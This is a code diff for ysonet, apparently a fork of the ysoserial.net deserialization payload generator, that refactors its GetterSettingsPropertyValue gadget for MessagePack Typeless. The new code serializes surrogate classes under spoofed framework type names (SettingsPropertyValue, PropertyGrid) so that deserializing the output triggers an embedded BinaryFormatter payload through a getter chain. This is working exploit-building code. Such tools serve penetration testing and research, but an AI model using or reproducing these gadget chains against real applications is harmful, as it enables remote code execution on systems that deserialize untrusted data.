@@ -264,7 +264,7 @@ namespace ysonet.Generators
 
                 return payload;
             }
-            else if (formatter.ToLowerInvariant().Equals("messagepacktypeless") || formatter.ToLowerInvariant().Equals("messagepacktypelesslz4"))
+            else if (IsMessagePackTypeless(formatter))
             {
                 Console.WriteLine("\r\nThis version of the gadget works for MessagePack >= 2.3.75\r\n");
                 if (variant_number != 1)
@@ -272,39 +272,73 @@ namespace ysonet.Generators
                     Console.WriteLine("GetterSettingsPropertyValue is implemented only for variant 1 (PropertyGrid getter chain). Switching to variant 1.\r\n");
                     variant_number = 1;
                 }
-                if (formatter.ToLowerInvariant().Equals("messagepacktypeless"))
-                {
-                    var serializedData = MessagePackGetterSettingsPropertyValueHelper.CreateGetterSettingsPropertyValueGadget(binaryFormatterPayload, false);
+                byte[] serializedData = BuildMessagePackTypeless(
+                    binaryFormatterPayload,
+                    IsMessagePackLz4(formatter));
 
-                    if (inputArgs.Test)
-                    {
-                        try
-                        {
-                            MessagePackGetterSettingsPropertyValueHelper.Test(serializedData, false);
-                        }
-                        catch { }
-                    }
-                    return serializedData;
-                }
-                else // LZ4
+                if (inputArgs.Test)
                 {
-                    var serializedData = MessagePackGetterSettingsPropertyValueHelper.CreateGetterSettingsPropertyValueGadget(binaryFormatterPayload, true);
-
-                    if (inputArgs.Test)
+                    try
                     {
-                        try
-                        {
-                            MessagePackGetterSettingsPropertyValueHelper.Test(serializedData, true);
-                        }
-                        catch { }
+                        MessagePackTypelessTypeSwap.Deserialize(serializedData, IsMessagePackLz4(formatter));
                     }
-                    return serializedData;
+                    catch { }
                 }
+                return serializedData;
             }
             else
             {
                 throw new Exception("Formatter not supported");
             }
+        }
+
+        // The MessagePack Typeless encoding of variant 1 (the PropertyGrid getter chain).
+        // Building the real graph would run the getter inside ysonet, so serialize the
+        // surrogate graph below and have MessagePack write the two framework type names
+        // instead of the surrogate ones. MessagePack >= 2.3.75.
+        private static byte[] BuildMessagePackTypeless(byte[] binaryFormatterPayload, bool useLz4)
+        {
+            var graph = new PropertyGridSurrogate
+            {
+                SelectedObjects = new object[]
+                {
+                    new SettingsPropertyValueSurrogate
+                    {
+                        Deserialized = false,
+                        SerializedValue = binaryFormatterPayload
+                    }
+                }
+            };
+
+            var targetTypeNames = new Dictionary<Type, string>
+            {
+                {
+                    typeof(SettingsPropertyValueSurrogate),
+                    "System.Configuration.SettingsPropertyValue, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
+                },
+                {
+                    typeof(PropertyGridSurrogate),
+                    "System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
+                }
+            };
+
+            return MessagePackTypelessTypeSwap.SerializeAs(graph, targetTypeNames, useLz4);
+        }
+
+        // Shape only, never deserialized as itself: MessagePackTypelessTypeSwap rewrites each
+        // type name to the framework type in the map above before the payload leaves ysonet.
+        // Every public property is written, so the member list must match the real target's
+        // (including the unset `property`, which the getter chain expects to see).
+        internal sealed class SettingsPropertyValueSurrogate
+        {
+            public bool Deserialized { get; set; }
+            public object SerializedValue { get; set; }
+            public object property { get; set; }
+        }
+
+        internal sealed class PropertyGridSurrogate
+        {
+            public object[] SelectedObjects { get; set; }
         }
     }
 
